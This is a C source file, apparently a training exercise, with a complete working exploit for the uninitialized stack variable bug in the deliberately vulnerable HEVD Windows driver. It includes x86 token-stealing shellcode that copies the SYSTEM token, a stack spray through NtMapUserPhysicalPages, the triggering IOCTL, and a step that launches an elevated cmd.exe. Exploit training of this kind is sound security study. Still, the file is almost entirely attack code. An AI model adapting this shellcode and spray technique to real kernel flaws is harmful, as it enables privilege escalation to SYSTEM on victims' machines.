#include "stdafx.h"
#include "windows.h"

/*
	Need to define NtMapUserPhysicalPages and its expected parameters here as else the compiler won't know how to call this.
	NTSTATUS is return type.
	WINAPI is the calling convention.
	(*_NtMapUserPhysicalPages) to define this as a function pointer and not a function taking in a pointer as its argument.
*/
typedef NTSTATUS(WINAPI *_NtMapUserPhysicalPages)(
	PINT BaseAddress,
	UINT32 NumberOfPages,
	PBYTE PageFrameNumbers);

int main()
{
	printf("Exploiting uninitialized stack variables in HEVD\r\n");
	printf("Opening handle to driver\r\n");
	HANDLE driverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to get handle to HEVD driver. Exiting. \r\n");
		return 1;
	}
	printf("Got valid handle: %i\r\n", driverHandle);
	char theBuffer[5] = "\x44\x45\x46\x47"; // Some bytes so we don't match the check for 0xBAD0B0B0
	
	printf("Getting address of NtMapUserPhysicalPages\r\n");
	/*
		Use GetModuleHandle to get handle to address of ntdll.dll, then use GetProcAddress to find the address of NtMapUserPhysicalPages from
		this DLL. Finally, cast the address to a _NtMapUserPhysicalPages function pointer so that the address appears to be a pointer to the NtMapUserPhysicalPages function in memory,
		and save this value into the variable NtMapUserPhysicalPages for later use.
	*/
	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");
	
	printf("Allocating shellcode....\r\n");
	char shellcode[60] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		"\xC3" // RET
	);
	printf("Shellcode size: %i\r\n", sizeof(shellcode));

	printf("Reserving RWX memory for shellcode with VirtualAlloc\r\n");
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Copying shellcode into this memory\r\n");
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress;

	printf("Spraying stack\r\n");
	int BaseAddress = 0; // We just need a pointer to 0, so lets first set up an integer which contains 0. Don't know if NULL would work here, imagine it should.
	char theSpray[4028] = { 0 }; // Set up our character array and initialize it using {0} to set every field to 0.
	printf("Setting up buffer theSpray and calling NtMapUserPhysicalPages\r\n");
	for (int i = 0; i < 1007; i++) { /* Don't ask me why this has to be 1007, I have a feeling I messed up the logic here, but this will ensure all the fields are filled
									 without copying into the memory of BaseAddress */
		memcpy((theSpray + (i * 4)), sourceAddress, 4); /* Copy source address into the memory of theSpray, starting at the memory pointed to by theSpray, then theSpray+4, then theSpray+8, etc.
														Aka simple loop to fill all of theSpray with the address of our shellcode */
	}
	printf("Going silent to try keep stack steady.\r\n"); // If we keep using printf we will push stuff onto the stack and change it therefore stop using printf to keep stack steady.
	NtMapUserPhysicalPages(&BaseAddress, 1024, (PBYTE)&theSpray); // Use a pointer to the int value 0 to ensure XXX, 1024 for the number of pages, so total memory will be 1024 * SIZE_OF_PAGE, aka 1024*4. 
																  // Finally we need a PBYTE pointer to the array we are using to make changes, which is third parameter.

	DWORD bytesReturned = 0; // Just need a space to hold the number of bytes returned so lets use a temp DWORD variable.
	DeviceIoControl(driverHandle, 0x22202F, &theBuffer, sizeof(theBuffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL); // This is fairly self explanatory from previous examples. Won't cover it again. Func number is 0x22202F here.

	printf("Hopefully that should have worked.\r\nCreating cmd.exe process\r\n");
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return 0;
}

